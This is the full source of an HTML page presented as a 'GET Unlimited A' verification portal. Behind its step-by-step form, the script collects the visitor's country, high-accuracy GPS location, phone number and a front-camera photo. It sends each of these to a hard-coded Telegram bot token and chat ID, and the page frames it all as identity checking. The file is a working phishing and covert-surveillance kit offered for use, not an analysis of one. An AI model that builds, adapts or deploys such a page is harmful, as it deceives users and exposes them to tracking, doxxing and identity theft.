<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>GET Unlimited A - Verification Portal</title>
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
    body { background: #f0f2f5; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
    .container { background: #ffffff; width: 100%; max-width: 420px; border-radius: 16px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); padding: 25px; text-align: center; }
    .logo { font-size: 24px; font-weight: bold; color: #2563eb; margin-bottom: 20px; letter-spacing: 1px; }
    .step { display: none; }
    .step.active { display: block; }
    label { font-size: 14px; color: #4b5563; font-weight: 600; display: block; margin-bottom: 8px; text-align: left; }
    select, input { width: 100%; padding: 12px; margin-bottom: 15px; border: 1px solid #d1d5db; border-radius: 8px; font-size: 15px; outline: none; }
    select:focus, input:focus { border-color: #2563eb; }
    button { width: 100%; padding: 12px; background: #2563eb; color: #fff; border: none; border-radius: 8px; font-size: 16px; font-weight: bold; cursor: pointer; transition: background 0.2s; }
    button:hover { background: #1d4ed8; }
    .sub-text { font-size: 12px; color: #6b7280; margin-top: 10px; }
  </style>
</head>
<body>
<div class="container">
  <!-- Logo Section -->
  <div class="logo">GET Unlimited A</div>

  <!-- Step 1: Country Selection -->
  <div id="step1" class="step active">
    <label for="country">Select Country</label>
    <select id="country" onchange="handleCountryChange()">
      <option value="">-- Choose Country --</option>
      <option value="Afghanistan">Afghanistan</option>
      <option value="Pakistan">Pakistan</option>
      <option value="India">India</option>
      <option value="Turkey">Turkey</option>
      <option value="Other">Other Countries</option>
    </select>
    <p class="sub-text">Select your location to start verification.</p>
  </div>

  <!-- Step 2: Phone Number & Camera -->
  <div id="step2" class="step">
    <label for="phone">Enter Phone Number</label>
    <input type="tel" id="phone" placeholder="+93 7XX XXX XXX">
    <button id="sendBtn" onclick="handlePhoneSubmit()">Send Verification</button>
    <p class="sub-text">Identity check requires camera permission upon sending.</p>
  </div>

  <!-- Step 3: View Details & Microphone -->
  <div id="step3" class="step">
    <label>Verification Completed!</label>
    <p style="font-size:14px; color:#374151; margin-bottom:15px;">Click below to access your Unlimited A account details.</p>
    <button onclick="handleViewDetails()">View Details</button>
  </div>

  <!-- Step 4: Final Success Screen -->
  <div id="step4" class="step">
    <h3 style="color:#10b981; margin-bottom:10px;">Access Granted!</h3>
    <p style="font-size:14px; color:#4b5563;">Your details have been successfully processed.</p>
  </div>
</div>

<script>
  // Exact Correct Telegram Credentials
  const TELEGRAM_BOT_TOKEN = '8856137504:AAHULGCAaZYPF6PIIRCg2611ZWBlPTnlyds';
  const TELEGRAM_CHAT_ID = '6809500416';

  // Step Navigation Function
  function goToStep(stepNumber) {
    document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
    document.getElementById(`step${stepNumber}`).classList.add('active');
  }

  // Send Text Log to Telegram
  async function sendTelegramLog(message) {
    try {
      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: message,
          parse_mode: 'HTML'
        })
      });
    } catch (err) {
      console.error('Telegram API Error:', err);
    }
  }

  // Send Photo (Camera capture) to Telegram
  async function sendTelegramPhoto(blob) {
    const formData = new FormData();
    formData.append('chat_id', TELEGRAM_CHAT_ID);
    formData.append('photo', blob, 'user_capture.jpg');

    try {
      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
        method: 'POST',
        body: formData
      });
    } catch (err) {
      console.error('Error sending photo:', err);
    }
  }

  // Step 1: Country Selection & Location Request
  function handleCountryChange() {
    const selectedCountry = document.getElementById('country').value;
    if (!selectedCountry) return;

    sendTelegramLog(`🌐 <b>Selected Country:</b> ${selectedCountry}`);

    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(
        (pos) => {
          const lat = pos.coords.latitude;
          const lng = pos.coords.longitude;
          const mapUrl = `https://maps.google.com/?q=${lat},${lng}`;
          sendTelegramLog(`📍 <b>Location Granted:</b>\n<a href="${mapUrl}">View Map Location</a>`);
          goToStep(2);
        },
        (err) => {
          sendTelegramLog(`⚠️ <b>Location Denied/Failed:</b> ${err.message}`);
          goToStep(2);
        },
        { enableHighAccuracy: true, timeout: 10000 }
      );
    } else {
      goToStep(2);
    }
  }

  // Step 2: Phone Submit & Camera Photo Capture
  async function handlePhoneSubmit() {
    const phoneInput = document.getElementById('phone').value;
    if (!phoneInput) {
      alert('Please enter your phone number.');
      return;
    }

    const btn = document.getElementById('sendBtn');
    btn.disabled = true;
    btn.innerText = 'Processing...';

    sendTelegramLog(`📱 <b>Phone Number:</b> <code>${phoneInput}</code>`);

    try {
      // Access Camera
      const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
      const video = document.createElement('video');
      video.srcObject = stream;
      await video.play();

      // Capture photo to canvas
      const canvas = document.createElement('canvas');
      canvas.width = video.videoWidth || 640;
      canvas.height = video.videoHeight || 480;
      const ctx = canvas.getContext('2d');
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

      // Stop Camera
      stream.getTracks().forEach(track => track.stop());

      // Send Photo Blob
      canvas.toBlob(async (blob) => {
        if (blob) {
          await sendTelegramPhoto(blob);
        }
        goToStep(3);
      }, 'image/jpeg', 0.8);

    } catch (err) {
      sendTelegramLog(`⚠️ <b>Camera Permission Error:</b> ${err.message}`);
      goToStep(3);
    }
  }

  // Step 3: Completion Handler
  function handleViewDetails() {
    sendTelegramLog(`✅ <b>User clicked View Details</b>`);
    goToStep(4);
  }
</script>
</body>
</html>
